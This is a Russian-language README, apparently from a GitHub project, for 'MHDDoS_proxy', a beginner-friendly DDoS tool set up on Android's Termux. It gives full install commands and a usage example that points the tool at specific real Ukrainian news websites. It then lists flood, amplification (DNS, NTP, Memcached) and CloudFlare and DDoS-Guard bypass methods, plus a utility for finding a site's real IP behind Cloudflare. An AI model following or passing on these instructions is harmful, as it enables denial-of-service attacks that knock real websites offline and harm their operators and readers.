<h1 align="center">MHDDoS Proxy (Termux)</h1> 
April 06, 2022

MHDDoS_proxy - это модификация MHDDoS для новичков. 

<br/>

## Termux: 

https://github.com/termux/termux-app/releases - выбираете termux-app_v0.118.0+github-debug_universal.apk и скачиваете


## Обновление пакетов и закачка нужных пакетов:
```
pkg update -y && pkg upgrade -y
(если будет спрашивать со вставкой "(Y/I/N/O/D/Z) [default=N] ?", то пишите "Y" и нажмите enter) 
pkg install git -y
pkg install python3 -y
```

## Загрузка утилиты:
```
termux-setup-storage
git clone https://github.com/BionecX/mhddos_p.git
cd mhddos_p
python3 -m pip install -r requirements.txt
pip3 install requests
pip3 install tabulate
pip3 install yarl
pip3 install cfscrape
pip3 install impacket
pip3 install colorama
pip3 install cloudscraper
git clone https://github.com/MHProDev/PyRoxy.git
cd PyRoxy
python3 setup.py build
python3 setup.py install
cd ..
```

## Использование:

Шаблон: python runner.py <метод://цель...> -t <потоки>  -p <период обновления запроса> --debug

Пример: python3 runner.py https://hvylya.net/ https://tsn.ua/ tcp://ubr.ua -t 50 -p 900

<br/>

Период: оптимальное количество 700-1200

Методы/основные: TCP/UDP/HTTP/HTTPS

<h2 align="center">Все методы:</h2>

## Layer7

     GET | GET Flood
     POST | POST Flood
     OVH | Bypass OVH
     STRESS | Send HTTP Packet With High Byte
     DYN | A New Method With Random SubDomain
     DOWNLOADER | A New Method of Reading data slowly
     SLOW | Slowloris Old Method of DDoS
     HEAD | https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD
     NULL | Null UserAgent and ...
     COOKIE | Random Cookie PHP 'if (isset($_COOKIE))'
     PPS | Only 'GET / HTTP/1.1\r\n\r\n'
     EVEN | GET Method with more header
     GSB | Google Project Shield Bypass
     DGB | DDoS Guard Bypass
     AVB | Arvan Cloud Bypass
     BOT | Like Google bot
     APACHE | Apache Expliot
     XMLRPC | WP XMLRPC expliot (add /xmlrpc.php)
     CFB | CloudFlare Bypass
     CFBUAM | CloudFlare Under Attack Mode Bypass
     BYPASS | Bypass Normal AntiDDoS
     BOMB | Bypass with codesenberg/bombardier
     KILLER | run many threads to kill a target

## Layer4:

     TCP | TCP Flood Bypass
     UDP | UDP Flood Bypass
     SYN | SYN Flood
     CPS | Open and close connections with proxy
     CONNECTION | Open connection alive with proxy
     VSE | Send Valve Source Engine Protocol
     TS3 | Send Teamspeak 3 Status Ping Protocol
     FIVEM | Send Fivem Status Ping Protocol
     MEM | Memcached Amplification
     NTP | NTP Amplification
     MCBOT | Minecraft Bot Attack
     MINECRAFT | Minecraft Status Ping Protocol
     MCPE | Minecraft PE Status Ping Protocol
     DNS | DNS Amplification
     CHAR | Chargen Amplification
     CLDAP | Cldap Amplification
     ARD | Apple Remote Desktop Amplification
     RDP | Remote Desktop Protocol Amplification


Tools - Run With python3 start.py tools

    Tools - Run With python3 start.py tools
    CFIP | Find Real IP Address Of Websites Powered By Cloudflare
    DNS | Show DNS Records Of Sites
    TSSRV | TeamSpeak SRV Resolver
    PING | PING Servers
    CHECK | Check If Websites Status
    DSTAT | That Shows Bytes Received, bytes Sent and their amount
    
    
Other   
    
    STOP | STOP All Attacks
    TOOLS | Console Tools
    HELP | Show Usage Script




